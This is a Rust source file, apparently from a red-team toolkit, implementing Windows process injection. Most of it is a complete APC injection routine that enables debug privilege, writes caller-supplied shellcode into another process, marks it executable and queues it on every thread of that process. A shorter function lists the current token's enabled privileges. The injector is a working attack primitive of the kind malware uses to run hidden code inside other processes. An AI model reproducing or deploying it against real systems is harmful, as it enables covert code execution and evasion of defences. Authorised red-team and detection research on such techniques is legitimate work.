//! Red Team capabilities - Process Injection and Persistence

use crate::error::MemoricError;
use crate::safe_handle::SafeHandle;
use serde_json::Value;

/// APC Injection - inject code via Asynchronous Procedure Call (task 5.5: completed with QueueUserAPC)
pub fn apc_inject(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
    };
    use windows::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_READWRITE,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, OpenThread, QueueUserAPC, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_WRITE, THREAD_SET_CONTEXT,
    };

    let pid = args
        .get("pid")
        .and_then(|v| v.as_u64())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing pid".to_string()))?;
    let shellcode = args
        .get("shellcode")
        .and_then(|v| v.as_array())
        .ok_or_else(|| MemoricError::InjectionFailed("Missing shellcode".to_string()))?;

    let shellcode_bytes: Vec<u8> = shellcode
        .iter()
        .filter_map(|v| v.as_u64().map(|b| b as u8))
        .collect();

    tracing::warn!("[REDTEAM] APC injection into process {}", pid);

    let _ = crate::privilege::debug::enable_debug_privilege(&serde_json::json!({}));

    unsafe {
        let handle = OpenProcess(
            PROCESS_QUERY_INFORMATION
                | PROCESS_VM_WRITE
                | PROCESS_VM_OPERATION
                | PROCESS_CREATE_THREAD,
            false,
            pid as u32,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open process: {}", e)))?;
        let handle = SafeHandle::new(handle);

        // W^X: allocate RW, write, then protect RX
        let remote_mem = VirtualAllocEx(
            *handle,
            None,
            shellcode_bytes.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if remote_mem.is_null() {
            return Err(MemoricError::InjectionFailed(format!(
                "Failed to allocate {} bytes in remote process (PID {})",
                shellcode_bytes.len(),
                pid
            )));
        }

        WriteProcessMemory(
            *handle,
            remote_mem,
            shellcode_bytes.as_ptr() as *const _,
            shellcode_bytes.len(),
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to write: {}", e)))?;

        let mut old_prot = windows::Win32::System::Memory::PAGE_PROTECTION_FLAGS(0);
        VirtualProtectEx(
            *handle,
            remote_mem,
            shellcode_bytes.len(),
            PAGE_EXECUTE_READ,
            &mut old_prot,
        )
        .map_err(|e| MemoricError::InjectionFailed(format!("VirtualProtectEx RX: {}", e)))?;

        // Enumerate threads and queue APC
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
            .map_err(|e| MemoricError::WindowsApi(format!("Failed to create snapshot: {}", e)))?;
        let _snapshot = SafeHandle::new(snapshot);

        let mut entry = THREADENTRY32 {
            dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
            ..Default::default()
        };

        let mut queued_count = 0u32;
        let mut thread_ids = Vec::new();

        if Thread32First(*_snapshot, &mut entry).is_ok() {
            loop {
                if entry.th32OwnerProcessID == pid as u32 {
                    if let Ok(thread_handle) =
                        OpenThread(THREAD_SET_CONTEXT, false, entry.th32ThreadID)
                    {
                        let _thread = SafeHandle::new(thread_handle);
                        let apc_routine: unsafe extern "system" fn(usize) =
                            std::mem::transmute(remote_mem);
                        if QueueUserAPC(Some(apc_routine), *_thread, 0) != 0 {
                            queued_count += 1;
                            thread_ids.push(entry.th32ThreadID);
                        }
                    }
                }
                if Thread32Next(*_snapshot, &mut entry).is_err() {
                    break;
                }
            }
        }

        if queued_count == 0 {
            return Err(MemoricError::InjectionFailed(
                "Failed to queue APC on any thread".to_string(),
            ));
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "apc_injection",
            "address": format!("0x{:016X}", remote_mem as usize),
            "shellcode_size": shellcode_bytes.len(),
            "threads_queued": queued_count,
            "thread_ids": thread_ids,
            "note": "APC will execute when target thread enters alertable wait state"
        }))
    }
}

/// Get System Privileges
pub fn get_system_privileges(_args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::Security::LookupPrivilegeNameW;
    use windows::Win32::Security::TOKEN_ACCESS_MASK;
    use windows::Win32::Security::{
        GetTokenInformation, TokenPrivileges, SE_PRIVILEGE_ENABLED, TOKEN_PRIVILEGES,
    };
    use windows::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};

    unsafe {
        let mut token_handle = HANDLE::default();
        OpenProcessToken(
            GetCurrentProcess(),
            TOKEN_ACCESS_MASK(0x0008), // TOKEN_QUERY
            &mut token_handle,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to open token: {}", e)))?;
        let _token = SafeHandle::new(token_handle);

        // Get required buffer size
        let mut size = 0u32;
        GetTokenInformation(*_token, TokenPrivileges, None, 0, &mut size).ok();

        let mut buffer = vec![0u8; size as usize];
        GetTokenInformation(
            *_token,
            TokenPrivileges,
            Some(buffer.as_mut_ptr() as *mut _),
            size,
            &mut size,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("Failed to get token info: {}", e)))?;

        let tp = &*(buffer.as_ptr() as *const TOKEN_PRIVILEGES);
        let mut privileges = Vec::new();

        let privileges_ptr = tp.Privileges.as_ptr();
        for i in 0..tp.PrivilegeCount as usize {
            let la = *privileges_ptr.add(i);
            let enabled = la.Attributes.0 & SE_PRIVILEGE_ENABLED.0;
            if enabled != 0 {
                let mut name = vec![0u16; 256];
                let mut name_len = name.len() as u32;
                if LookupPrivilegeNameW(
                    None,
                    &la.Luid,
                    windows::core::PWSTR(name.as_mut_ptr()),
                    &mut name_len,
                )
                .is_ok()
                {
                    name.truncate(name_len as usize);
                    let name_str = String::from_utf16_lossy(&name);
                    privileges.push(name_str.trim_end_matches('\0').to_string());
                }
            }
        }

        Ok(serde_json::json!({
            "privileges": privileges,
            "count": privileges.len()
        }))
    }
}
